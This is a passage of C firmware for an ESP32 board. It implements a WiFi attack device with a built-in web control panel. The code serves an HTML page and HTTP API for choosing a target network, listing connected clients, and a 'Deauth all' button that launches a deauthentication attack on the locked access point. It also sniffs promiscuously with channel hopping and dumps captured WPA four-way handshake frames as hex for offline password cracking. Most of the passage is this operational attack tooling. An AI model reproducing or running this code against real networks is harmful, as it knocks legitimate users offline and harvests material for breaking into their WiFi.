    "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>ESP32 Control</title>"
    "<style>body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:12px}table{width:100%;border-collapse:collapse}td{vertical-align:top;padding:8px;width:50%}"
    ".card{border:1px solid #ddd;border-radius:8px;padding:10px;margin:8px 0}button{padding:6px 10px;border:1px solid #888;border-radius:6px;background:#f4f4f4;cursor:pointer}li{cursor:pointer}pre{white-space:pre-wrap}"
    "</style></head><body>"
    "<table><tr>"
    "<td>"
      "<div class='card'><h3>BSSID (self)</h3><div id='ssidCurrent'>(n/a)</div></div>"
      "<div class='card'><h3>Deauth</h3><button onclick=\"deauth()\">Deauth all</button></div>"
      "<div class='card'><h3>Output</h3><pre id='output'></pre></div>"
    "</td>"
    "<td>"
      "<div class='card'><h3>Target SSID</h3><input id='ssidInput' value='' placeholder='Enter target SSID'><button onclick='setSsid()'>Set</button><div id='targetStatus'>(none)</div></div>"
      "<div class='card'><h3>Clients</h3><ul id='clientsList'></ul></div>"
      "<div class='card'><h3>Networks</h3><ul id='ssidList'></ul></div>"
      "<div class='card'><h3>Captured handshakes</h3><span id='capturedHs'>0</span></div>"
    "</td>"
    "</tr></table>"
    "<script>"
    "async function refresh(){try{let r=await fetch('/api/state');let s=await r.json();"
      "document.getElementById('ssidCurrent').textContent=s.ssid_current||'(n/a)';"
      "document.getElementById('targetStatus').textContent=s.target_ssid||'(scanning)';"
      "document.getElementById('capturedHs').textContent=s.captured_hs;"
      "document.getElementById('output').textContent = s.output || s.log || '';"
      "let sl=document.getElementById('ssidList');sl.innerHTML='';let ssids=await(await fetch('/api/ssid_list')).json();ssids.forEach(ss=>{let li=document.createElement('li');li.textContent=`${ss.ssid} (${ss.rssi}dBm CH${ss.ch})`;li.onclick=()=>setTarget(ss.ssid);sl.appendChild(li);});"
      "let cl=document.getElementById('clientsList');cl.innerHTML='';(s.clients||[]).forEach(mac=>{let li=document.createElement('li');li.textContent=mac;li.onclick=()=>selectClient(mac);cl.appendChild(li);});"
    "}catch(e){console.log(e);}}"
    "async function chooseSsid(ss){await fetch('/api/choose_ssid?ssid='+encodeURIComponent(ss),{method:'POST'});refresh();}"
    "async function selectClient(mac){await fetch('/api/select_client?mac='+encodeURIComponent(mac),{method:'POST'});refresh();}"
    "async function deauth(){await fetch('/api/deauth',{method:'POST'});refresh();}"
    "setInterval(refresh,1000);refresh();"
    "async function setSsid(){let ss= document.getElementById('ssidInput').value;await fetch('/api/set_target_ssid?ssid='+encodeURIComponent(ss),{method:'POST'});refresh();}"
    "</script></body></html>";

    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, page, HTTPD_RESP_USE_STRLEN);
}


// ---- put this near your other statics ----
#define MAX_HEX_BYTES 512  // per field; set higher if you want full frames

#include "esp_heap_caps.h"

// Cap how many bytes of each frame we hex-dump to the page (keeps JSON small)
#ifndef MAX_HEX_BYTES
#define MAX_HEX_BYTES 512
#endif

static esp_err_t api_state_handler(httpd_req_t *req) {
    // ---------- Clients JSON (small; fine on stack) ----------
    char clients_json[768];
    size_t off = 0; int wrote = 0;
    clients_json[off++]='[';
    for (int i = 0; i < client_count && i < 50; ++i) {
        const uint8_t *mac = clients[i];
        bool zero = true; for (int k = 0; k < 6; ++k) { if (mac[k]) { zero = false; break; } }
        if (zero) continue;
        char macs[18]; mac_to_str(mac, macs, sizeof(macs));
        if (wrote++) clients_json[off++]=',';
        off += snprintf(clients_json+off, sizeof(clients_json)-off, "\"%s\"", macs);
        if (off >= sizeof(clients_json)-4) break;
    }
    clients_json[off++]=']';
    clients_json[off]='\0';

    // --- Self BSSID (AP MAC) ---
    uint8_t ap_mac[6] = {0};
    esp_err_t em = esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
    char self_bssid_str[18];
    if (em == ESP_OK) {
        mac_to_str(ap_mac, self_bssid_str, sizeof(self_bssid_str));
    } else {
        snprintf(self_bssid_str, sizeof(self_bssid_str), "(unknown)");
    }

    // ---------- SSID list (unchanged) ----------
    char ssid_json[256];
    char targ_bssid_str[18];
    if (g_have_locked_bssid) {
        mac_to_str(g_locked_bssid, targ_bssid_str, sizeof(targ_bssid_str));
    } else if (g_target_ap_record_valid) {
        mac_to_str(g_target_ap_record.bssid, targ_bssid_str, sizeof(targ_bssid_str));
    } else {
        snprintf(targ_bssid_str, sizeof(targ_bssid_str), "(none)");
    }
    // One entry like: "LFS-SD (AA:BB:CC:DD:EE:FF)"
    snprintf(ssid_json, sizeof(ssid_json), "[\"%s%s (%s)\"]", 
         strlen(g_target_ssid) ? g_target_ssid : "Scanning...", 
         strlen(g_target_ssid) ? "" : " (none)", targ_bssid_str);

    // ---------- Allocate big buffers in INTERNAL DRAM (not on stack) ----------
    const size_t hs_cap   = 8000;   // text buffer for handshake dump
    const size_t out_cap  = 12000;  // escaped hs_text for JSON
    const size_t json_cap = 14000;  // combined JSON payload

    char *hs_text     = heap_caps_malloc(hs_cap,   MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    char *out_escaped = heap_caps_malloc(out_cap,  MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    char *json        = heap_caps_malloc(json_cap, MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

    if (!hs_text || !out_escaped || !json) {
        free(hs_text); free(out_escaped); free(json);
        return httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OOM");
    }

    // ---------- Build handshake dump (completed only) ----------
    size_t h = 0;
    int shown = 0;

    for (int i = 0; i < MAX_HS; ++i) {
        const hs_entry_t *hs = &handshakes[i];
        if (!hs->complete) continue;  // only completed handshakes

        // BSSID line
        char bssid_str[18]; mac_to_str(hs->bssid, bssid_str, sizeof(bssid_str));
        h += snprintf(hs_text + h, hs_cap - h, "#%02d BSSID=%s\n", i, bssid_str);

        // Helper macro to append a labeled field as hex (truncated)
        #define DUMP_FIELD(label, ptr, len) do {                                           \
            if ((ptr) && (len) > 0 && h < hs_cap) {                                        \
                h += snprintf(hs_text + h, hs_cap - h, "  %s=", (label));                  \
                size_t want = (len);                                                       \
                bool trunc = false;                                                        \
                if (want > MAX_HEX_BYTES) { want = MAX_HEX_BYTES; trunc = true; }          \
                h += hex_to_buf_spaces(hs_text + h, (h < hs_cap) ? (hs_cap - h) : 0,       \
                                    (const uint8_t*)(ptr), want);                       \
                if (trunc && h < hs_cap) h += snprintf(hs_text + h, hs_cap - h,            \
                                                    "...(truncated)");                  \
                if (h < hs_cap) hs_text[h++] = '\n';                                       \
            }                                                                              \
        } while (0)


        DUMP_FIELD("M1",     hs->m1,     hs->m1_len);
        DUMP_FIELD("M2",     hs->m2,     hs->m2_len);
        DUMP_FIELD("M3",     hs->m3,     hs->m3_len);
        DUMP_FIELD("M4",     hs->m4,     hs->m4_len);
        DUMP_FIELD("BEACON", hs->beacon, hs->beacon_len);

        #undef DUMP_FIELD

        if (h < hs_cap) hs_text[h++] = '\n';
        shown++;

        if (h >= hs_cap - 256) {
            h += snprintf(hs_text + h, hs_cap - h, "...truncated output...\n");
            break;
        }
    }

    if (shown == 0) {
        h += snprintf(hs_text + h, hs_cap - h, "(no completed handshakes)");
    }
    if (h >= hs_cap) h = hs_cap - 1;
    hs_text[h] = '\0';

    // ---------- Escape hs_text for JSON ----------
    size_t oi = 0;
    for (size_t i = 0; hs_text[i] != '\0' && oi < out_cap - 1; ++i) {
        unsigned char c = (unsigned char)hs_text[i];
        if (c == '"' || c == '\\') {
            if (oi < out_cap - 2) out_escaped[oi++]='\\';
            out_escaped[oi++] = (char)c;
        } else if (c == '\n') {
            if (oi < out_cap - 2) { out_escaped[oi++]='\\'; out_escaped[oi++]='n'; }
        } else if (c == '\r') {
            if (oi < out_cap - 2) { out_escaped[oi++]='\\'; out_escaped[oi++]='r'; }
        } else if (c == '\t') {
            if (oi < out_cap - 2) { out_escaped[oi++]='\\'; out_escaped[oi++]='t'; }
        } else if (c < 0x20) {
            if (oi < out_cap - 1) out_escaped[oi++] = ' ';
        } else {
            out_escaped[oi++] = (char)c;
        }
    }
    out_escaped[oi] = '\0';

    // ---------- Escape web_output for a "log" field ----------
    char log_escaped[512];
    size_t lo = 0;
    for (size_t i = 0; web_output[i] && lo < sizeof(log_escaped) - 1; ++i) {
        unsigned char c = (unsigned char)web_output[i];
        if (c=='"' || c=='\\') { if (lo < sizeof(log_escaped)-2) log_escaped[lo++]='\\'; log_escaped[lo++]=c; }
        else if (c=='\n')      { if (lo < sizeof(log_escaped)-2) { log_escaped[lo++]='\\'; log_escaped[lo++]='n'; } }
        else if (c=='\r')      { if (lo < sizeof(log_escaped)-2) { log_escaped[lo++]='\\'; log_escaped[lo++]='r'; } }
        else if (c=='\t')      { if (lo < sizeof(log_escaped)-2) { log_escaped[lo++]='\\'; log_escaped[lo++]='t'; } }
        else if (c < 0x20)     { if (lo < sizeof(log_escaped)-1) log_escaped[lo++]=' '; }
        else log_escaped[lo++] = (char)c;
    }
    log_escaped[lo] = '\0';

    // ---------- Build & send JSON ----------
    int n = snprintf(json, json_cap,
    "{\"ssid_current\":\"%s\",\"target_ssid\":\"%s\",\"captured_hs\":%d,\"ssid_list\":%s,"
    "\"clients\":%s,\"output\":\"%s\",\"log\":\"%s\"}",
    self_bssid_str,
    g_target_ssid,
    count_captured_hs(),
    ssid_json,
    clients_json, out_escaped, log_escaped);

    httpd_resp_set_type(req, "application/json");
    esp_err_t r = httpd_resp_send(req, json, (n > 0 && n < (int)json_cap) ? n : HTTPD_RESP_USE_STRLEN);

    free(hs_text);
    free(out_escaped);
    free(json);
    return r;
}

// --- API endpoints ---
static esp_err_t api_choose_ssid_handler(httpd_req_t *req){
    char query[96]={0}, ssid[33]={0};
    if (httpd_req_get_url_query_len(req)>0 && httpd_req_get_url_query_str(req, query, sizeof(query))==ESP_OK){
        httpd_query_key_value(query, "ssid", ssid, sizeof(ssid));
    }
    if (ssid[0]) web_set_outputf("Selected SSID: %s", ssid); else web_set_outputf("Selected SSID: (missing)");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_sendstr(req, "{\"ok\":true}");
}

static esp_err_t api_select_client_handler(httpd_req_t *req){
    char query[96]={0}, mac[32]={0};
    if (httpd_req_get_url_query_len(req)>0 && httpd_req_get_url_query_str(req, query, sizeof(query))==ESP_OK){
        httpd_query_key_value(query, "mac", mac, sizeof(mac));
    }
    if (mac[0]) web_set_outputf("Selected client: %s", mac); else web_set_outputf("Selected client: (missing)");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_sendstr(req, "{\"ok\":true}");
}

static void stop_webserver_deferred(void);

static void deauth_job(void *arg);

static esp_err_t api_deauth_handler(httpd_req_t *req)
{
    if (!g_target_ap_record_valid) {
        ESP_LOGW(TAG, "Deauth skipped: no target AP locked yet.");
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_sendstr(req, "{\"ok\":false,\"reason\":\"no_target\"}");
    }

    // 1) Send response while AP/httpd is still alive
    httpd_resp_set_type(req, "application/json");
    esp_err_t r = httpd_resp_sendstr(req, "{\"ok\":true}");

    // 2) Kick a one-shot worker task to do the disruptive stuff
    xTaskCreate(deauth_job, "deauth_job", 4096, NULL, 5, NULL);
    return r;
}

static void deauth_job(void *arg)
{
    // (Optional) give the client a moment to receive the JSON
    vTaskDelay(pdMS_TO_TICKS(50));

    // Do the actual action
    deauth_all_clients(g_locked_bssid, 4);

    vTaskDelete(NULL);
}

// --- Server start ---
static httpd_handle_t start_webserver(void) {
    if (server) return server;                 // already running
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.stack_size = 8192;                  // <= keep stack modest to stay in IRAM DRAM
    // Optionally pin to core 0 with: config.core_id = 0;

    if (httpd_start(&server, &config) == ESP_OK) {
        static const httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_get_handler };
        static const httpd_uri_t api_state = { .uri = "/api/state", .method = HTTP_GET, .handler = api_state_handler };
        static const httpd_uri_t api_choose_ssid = { .uri = "/api/choose_ssid", .method = HTTP_POST, .handler = api_choose_ssid_handler };
        static const httpd_uri_t api_select_client = { .uri = "/api/select_client", .method = HTTP_POST, .handler = api_select_client_handler };
        static const httpd_uri_t api_deauth = { .uri = "/api/deauth", .method = HTTP_POST, .handler = api_deauth_handler };
        static const httpd_uri_t api_set_ssid = {.uri = "/api/set_target_ssid", .method = HTTP_POST, .handler = api_set_target_ssid_handler, .user_ctx = NULL};
        static const httpd_uri_t ssid_list_uri = {.uri = "/api/ssid_list", .method = HTTP_GET, .handler = api_ssid_list_handler, .user_ctx = NULL};
        httpd_register_uri_handler(server, &ssid_list_uri);
        httpd_register_uri_handler(server, &api_set_ssid);
        httpd_register_uri_handler(server, &root);
        httpd_register_uri_handler(server, &api_state);
        httpd_register_uri_handler(server, &api_choose_ssid);
        httpd_register_uri_handler(server, &api_select_client);
        httpd_register_uri_handler(server, &api_deauth);
        ESP_LOGI(TAG, "HTTP server started on port %d", config.server_port);
    }
    return server;
}

static void stop_webserver(void) {
    if (!server) return;
    httpd_handle_t s = server;
    server = NULL;
    httpd_stop(s);
    ESP_LOGW(TAG, "HTTP server stopped");
}

static void stop_webserver_deferred(void) {
    // one-shot timer calls stop_webserver() from the timer task
    static TimerHandle_t t = NULL;
    if (!t) t = xTimerCreate("httpd_stop", pdMS_TO_TICKS(50), pdFALSE, NULL,
                             (TimerCallbackFunction_t)stop_webserver);
    xTimerStart(t, 0);
}
// ==== Boot button / manual channel stepping ================================

static void boot_btn_init(void) {
    gpio_config_t io = { .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO, .mode = GPIO_MODE_INPUT, .pull_up_en = GPIO_PULLUP_ENABLE, .pull_down_en = GPIO_PULLDOWN_DISABLE, .intr_type = GPIO_INTR_DISABLE };
    gpio_config(&io);
}
static bool boot_btn_pressed(void) { return gpio_get_level(BOOT_BUTTON_GPIO) == 0; }

static void step_channel(int delta) {
    if (!g_sniffer_active) { ESP_LOGW(TAG, "Channel step ignored (not in sniffer mode)"); return; }
    const uint8_t max_ch = 13;
    uint8_t ch = g_current_channel ? g_current_channel : 1;

    uint8_t newch;
    if (delta > 0)       newch = (uint8_t)((ch % max_ch) + 1);
    else if (delta < 0)  newch = (uint8_t)((ch == 1) ? max_ch : (ch - 1));
    else                 newch = ch;

    g_channel_locked = false; // unlock if manually stepping

    esp_wifi_set_channel(newch, WIFI_SECOND_CHAN_NONE);
    g_current_channel = newch;
    hopper = false;
    ESP_LOGI(TAG, "Manual channel %s -> %u", (delta > 0 ? "UP" : "DOWN"), newch);
}

void boot_btn_task(void *arg) {
    (void)arg; boot_btn_init(); int last = 1;
    for (;;) {
        int lvl = gpio_get_level(BOOT_BUTTON_GPIO);
        if (last == 1 && lvl == 0) {
            TickType_t t0 = xTaskGetTickCount(); vTaskDelay(pdMS_TO_TICKS(30));
            if (boot_btn_pressed()) {
                while (boot_btn_pressed()) vTaskDelay(pdMS_TO_TICKS(10));
                TickType_t t1 = xTaskGetTickCount();
                uint32_t held_ms = (uint32_t)((t1 - t0) * portTICK_PERIOD_MS);
                if (held_ms >= 5000) {
                    step_channel(-1);
                }
                else if (held_ms >= 2000) step_channel(+1);
                else {
                    toggle_wifi_mode(true);
                    server = start_webserver();
                }
            }
            vTaskDelay(pdMS_TO_TICKS(150));
        }
        last = lvl; vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// ==== Channel hopper (no scan; just hop & lock; record built from Beacon) ===
static void channel_hopper(void *arg) {
    (void)arg;
    const uint8_t max_ch = 13;
    static bool prev_locked = false;

    for (;;) {
        handshake_housekeeping();
        if (hopper) {
            if (!g_sniffer_active) { vTaskDelay(pdMS_TO_TICKS(500)); continue; }

            bool rising_lock = (!prev_locked && g_channel_locked);
            prev_locked = g_channel_locked;

            if (g_channel_locked) {
                // Ensure AP/PHY both sit on the locked channel
                if (g_current_channel != g_locked_channel) {
                    g_desired_ap_channel = g_locked_channel;
                    apply_ap_channel(g_locked_channel);
                    ESP_LOGI(TAG, "Now holding channel %u", g_current_channel);
                }

                if ((xTaskGetTickCount() - g_last_frame_tick) > pdMS_TO_TICKS(LOCK_IDLE_MS)) {
                    ESP_LOGI(TAG, "No frames for %u ms -> unlocking & resuming hop", (unsigned)LOCK_IDLE_MS);
                    g_channel_locked = false;
                }
                vTaskDelay(pdMS_TO_TICKS(100));
                continue;
            }


            for (uint8_t ch = 1; ch <= max_ch && g_sniffer_active && !g_channel_locked; ++ch) {
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                g_current_channel = ch;
                vTaskDelay(pdMS_TO_TICKS(500));
            }
        } else {
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }
}

// ==== Bootstrapping ========================================================
void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) { ESP_ERROR_CHECK(nvs_flash_erase()); ret = nvs_flash_init(); }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    for (int i = 0; i < MAX_HS; i++ ) handshakes[i] = (hs_entry_t){0};

    memset(clients_r, 0, sizeof(clients_r));
    memset(clients_s, 0, sizeof(clients_s));

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    toggle_wifi_mode(false); // start in sniffer mode

    server = start_webserver();

    g_last_frame_tick = xTaskGetTickCount();
    xTaskCreate(boot_btn_task, "boot_btn", 6144, NULL, 5, NULL);
    xTaskCreate(channel_hopper, "chan_hop", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "Promiscuous sniffer started (Beacon->AP record; no scans)");
}
